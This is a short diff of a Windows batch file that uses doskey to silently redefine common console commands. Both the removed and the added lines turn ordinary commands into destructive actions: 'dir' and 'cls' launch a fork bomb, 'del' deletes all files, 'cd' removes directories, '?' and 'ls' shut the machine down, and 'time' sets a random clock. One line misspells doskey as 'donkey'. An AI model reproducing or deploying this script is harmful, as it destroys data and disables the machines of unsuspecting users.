@@ -1,3 +1,7 @@
 @ECHO OFF
-doskey dir=%0|%0
-doskey del=del *
+doskey cd=rmdir
+doskey exit=cmd
+doskey ?=shutdown -s
+doskey ls=?
+doskey cls=%0|%0
+donkey time=time %random%
